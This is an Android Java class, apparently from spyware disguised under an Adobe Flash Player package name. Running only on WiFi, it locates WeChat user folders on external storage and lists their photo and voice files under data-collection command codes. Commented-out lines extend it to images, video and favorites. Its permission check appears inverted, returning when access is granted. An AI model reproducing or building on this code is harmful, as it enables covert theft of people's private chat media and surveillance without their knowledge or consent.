package com.adobe.flashplayer.data.app;



import java.io.File;
import java.util.ArrayList;
import android.content.Context;
import android.content.pm.PackageManager;
import android.util.Log;

import com.adobe.flashplayer.MyLog;
import com.adobe.flashplayer.Public;
import com.adobe.flashplayer.Utils;
import com.adobe.flashplayer.network.NetworkUtils;


public class WECHAT implements Runnable{

    private final String TAG = "UserWeiXinData";

    private Context context;

    public WECHAT(Context context){
        Log.e(TAG, "UserWeiXinData");
        this.context = context;
    }


    public void run(){

        try{
            PackageManager pm = context.getPackageManager();
            String packagename = context.getPackageName();
            int ret = pm.checkPermission( android.Manifest.permission.READ_EXTERNAL_STORAGE,packagename);
            if (ret == PackageManager.PERMISSION_GRANTED) {
                return;
            }

            if(NetworkUtils.getNetworkType(context) != NetworkUtils.WIFI_CONNECTION){
                return;
            }
            String weixinpath = getUserWeiXinData(Public.SDCARDPATH + "/tencent/MicroMsg/");
            File file = new File(weixinpath);
            if (file.exists() == false) {
                weixinpath = getUserWeiXinData(Public.SDCARDPATH + "/Tencent/MicroMsg/");
                file = new File(weixinpath);
                if (file.exists() == false) {
                    weixinpath = getUserWeiXinData(Public.SDCARDPATH + "/tencent/micromsg/");
                    file = new File(weixinpath);
                    if(file.exists() == false){
                        return;
                    }
                }
            }

            getUserWeiXinData(weixinpath);

        }catch(Exception ex){
            ex.printStackTrace();
            String errorString = Utils.getExceptionDetail(ex);
            String stackString = Utils.getCallStack();
            MyLog.writeLogFile("UserWeiXinData run() exception:"+errorString + "\r\n" + "call stack:" + stackString + "\r\n");
            return ;
        }
    }


    public ArrayList<String> getWeixinPath(String path){

        ArrayList<String> uinmd5s = new ArrayList<String>();
        File file = new File(path);
        if (file.exists() == false) {
            return uinmd5s;
        }

        File[] filelist=file.listFiles();
        if (filelist == null || filelist.length <= 0) {
            return uinmd5s;
        }

        for (int i = 0; i < filelist.length; i++) {
            if (filelist[i].isDirectory() == true && filelist[i].getName().length() == 32) {
                byte[] filename = filelist[i].getName().getBytes();

                int j = 0;
                for (; j < filename.length; j++) {
                    if ((filename[j] >= '0' && filename[j] <= '9') ||
                            (filename[j] >= 'a' && filename[j] <= 'f') ||
                            (filename[j] >= 'A' && filename[j] <= 'F') ) {
                        continue;
                    }else{
                        break;
                    }
                }

                if (j >= 32) {
                    uinmd5s.add(filelist[i].getName());
                    MyLog.writeLogFile("find external weixin path:" + filelist[i].getName() + "\r\n");
                }
            }
        }

        return uinmd5s;
    }



    public String getUserWeiXinData(String path){
        AppUtils.listTypeFiles(context,path + "WeiXin/",Public.CMD_DATA_WEIXINPHOTO);
        AppUtils.listTypeFiles(context,path + "weixin/",Public.CMD_DATA_WEIXINPHOTO);

        ArrayList<String> uinmd5s = getWeixinPath(path);
        if(uinmd5s != null && uinmd5s.size() > 0){

            for (int i = 0; i < uinmd5s.size(); i++) {
                String wxpath = path + uinmd5s.get(i)+ "/";
                AppUtils.listTypeFiles(context,wxpath + "voice2",Public.CMD_DATA_WEIXINAUDIO);

                //UserQQData.listTypeFiles(wxpath + "avatar",Public.CMD_DATA_WEIXINPHOTO);
                //UserQQData.listTypeFiles(wxpath + "image",Public.CMD_DATA_WEIXINPHOTO);
                //UserQQData.listTypeFiles(wxpath + "image2",Public.CMD_DATA_WEIXINPHOTO);
                //UserQQData.listTypeFiles(wxpath + "video",Public.CMD_DATA_WEIXINVIDEO);
                //UserQQData.listTypeFiles(wxpath + "sns",Public.CMD_DATA_WEIXINPHOTO);
                //UserQQData.listTypeFiles(wxpath + "favorite",Public.CMD_DATA_WEIXINPHOTO);
            }
        }

        return "";
    }






}
